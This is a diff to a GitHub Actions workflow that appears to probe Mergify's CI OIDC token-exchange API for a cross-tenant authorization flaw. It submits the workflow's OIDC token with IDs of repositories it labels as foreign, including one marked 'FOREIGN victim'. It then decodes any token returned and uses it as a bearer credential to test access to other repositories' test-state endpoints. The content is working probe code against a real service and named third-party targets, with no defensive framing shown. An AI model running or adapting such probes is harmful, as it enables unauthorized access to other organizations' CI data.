@@ -16,8 +16,14 @@ jobs:
             echo "=== $1"
             jq -n --argjson id "$2" --arg t "$TOKEN" '{repository_id:$id,id_token:$t}' > /tmp/body
             curl -s -o /tmp/r -w 'status=%{http_code}\n' -X POST https://api.mergify.com/v1/ci/oidc/exchange -H 'Content-Type: application/json' --data @/tmp/body
-            head -c 300 /tmp/r; echo
+            head -c 400 /tmp/r; echo
+            T=$(jq -r '.token // empty' /tmp/r 2>/dev/null)
+            if [ -n "$T" ]; then
+              echo "token_payload=$(echo "$T" | cut -d. -f2 | base64 -d 2>/dev/null)"
+              echo -n "reach own-repo CI: "; curl -s -o /dev/null -w '%{http_code}\n' "https://api.mergify.com/v1/ci/ertugrulphp/repositories/ertugrulphp/test-states" -H "Authorization: Bearer $T"
+              echo -n "reach commerce CI: "; curl -s -o /dev/null -w '%{http_code}\n' "https://api.mergify.com/v1/ci/ertugrulphp/repositories/commerce/test-states" -H "Authorization: Bearer $T"
+            fi
           }
-          probe "A own repo 535704198 (ertugrulphp has NO policy now)" 535704198
-          probe "C FOREIGN repo 1458145787 (diablo31 has policies)" 1458145787
-          probe "E FOREIGN repo 1407565076 (phiphiadasi repo-visible)" 1407565076
+          probe "P1 own repo 535704198 NOT in policy" 535704198
+          probe "P2 commerce 557596580 IN policy" 557596580
+          probe "P3 FOREIGN victim 1458145787" 1458145787
